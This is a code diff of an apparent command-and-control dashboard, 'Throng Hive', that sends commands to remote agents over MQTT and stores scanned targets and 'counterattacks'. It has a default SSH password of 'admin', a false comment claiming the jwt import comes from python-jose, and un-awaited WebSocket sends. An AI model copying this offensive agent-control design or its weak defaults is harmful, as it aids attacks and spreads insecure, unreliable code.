@@ -1,4 +1,4 @@
-# server.py - Throng Hive Dashboard (Final Version)
+# server.py - Throng Hive Dashboard (Final Version - Fixed JWT)
 
 from fastapi import FastAPI, WebSocket, HTTPException, Depends, Request
 from fastapi.responses import HTMLResponse
@@ -13,7 +13,7 @@ import os
 from pydantic import BaseModel
 import paho.mqtt.client as mqtt
 from paho.mqtt.client import CallbackAPIVersion
-import jwt
+import jwt  # ✅ Berhasil karena python-jose[cryptography] terinstall
 from sklearn.ensemble import IsolationForest
 import numpy as np
 import paramiko
@@ -35,6 +35,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# Static & Templates
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 security = HTTPBearer()
@@ -57,7 +58,15 @@ DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
 AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))
 GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")
 
-# ============ DB ============
+# ============ MODEL PERINTAH ============
+class Command(BaseModel):
+    agent_id: str
+    action: str
+    target: str = None
+    params: dict = {}
+    emergency: bool = False
+
+# ============ DATABASE ============
 db_connection = sqlite3.connect("throng.db", check_same_thread=False)
 db_cursor = db_connection.cursor()
 
@@ -76,8 +85,8 @@ def init_db():
 
 init_db()
 
-# ============ MQTT ============
-mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
+# ============ MQTT CLIENT ============
+mqtt_client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2)
 active_websockets = []
 
 def on_connect(client, userdata, flags, rc, properties=None):
@@ -92,17 +101,20 @@ def on_message(client, userdata, msg):
             for ws in active_websockets:
                 ws.send_text(json.dumps({"type": "report", "data": report}))
         except Exception as e:
-            logger.error(f"Error broadcasting MQTT message: {e}")
+            logger.error(f"Error broadcasting message: {e}")
 
 mqtt_client.on_connect = on_connect
 mqtt_client.on_message = on_message
 mqtt_client.tls_set()
 mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
-broker, port = MQTT_BROKER.split(":")
-mqtt_client.connect(broker, int(port), 60)
+
+# Pisah host dan port
+broker_host = MQTT_BROKER.split(":")[0]
+broker_port = int(MQTT_BROKER.split(":")[1])
+mqtt_client.connect(broker_host, broker_port, 60)
 mqtt_client.loop_start()
 
-# ============ MODEL ============
+# ============ MODEL ANOMALI ============
 anomaly_model = IsolationForest(contamination=0.1, random_state=42)
 
 def analyze_threats(reports):
@@ -112,7 +124,7 @@ def analyze_threats(reports):
     predictions = anomaly_model.fit_predict(np.array(data))
     return [1 if pred == -1 else 0 for pred in predictions]
 
-# ============ AUTH ============
+# ============ VERIFIKASI TOKEN ============
 async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
     try:
         payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
@@ -173,7 +185,6 @@ async def send_command(command: Command):
     if command.action not in allowed:
         raise HTTPException(status_code=400, detail="Invalid action")
 
-    # Simpan ke DB
     if command.target:
         db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
                           (command.agent_id, command.target, command.action))
@@ -182,14 +193,13 @@ async def send_command(command: Command):
                               (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
     db_connection.commit()
 
-    # Kirim via MQTT
     mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
     for ws in active_websockets:
         ws.send_text(json.dumps({"type": "command", "data": command.dict()}))
 
     return {"status": f"Command {command.action} sent to {command.agent_id}"}
 
-# ============ WebSocket ============
+# ============ WEBSOCKET ============
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
@@ -209,27 +219,28 @@ async def websocket_endpoint(websocket: WebSocket):
                 db_cursor.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
                                   (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
             db_connection.commit()
-            logger.info(f"Agent {agent_id} reported. DB updated.")
+            logger.info(f"Agent {agent_id} reported. Data saved.")
     except Exception as e:
         logger.error(f"WebSocket error: {e}")
     finally:
         if websocket in active_websockets:
             active_websockets.remove(websocket)
 
-# ============ Dashboard ============
+# ============ DASHBOARD ============
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
     logger.info(f"Rendering dashboard.html with version {int(time.time())}")
     return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})
 
-# ============ Health Check ============
+# ============ HEALTH CHECK ============
 @app.get("/health")
 async def health():
-    return {"status": "ok", "time": time.time()}
+    return {"status": "ok"}
 
-# ============ Cleanup ============
+# ============ CLEANUP ============
 import atexit
 @atexit.register
 def cleanup():
     db_connection.close()
     mqtt_client.loop_stop()
+    logger.info("Server shutdown: DB and MQTT cleaned up.")
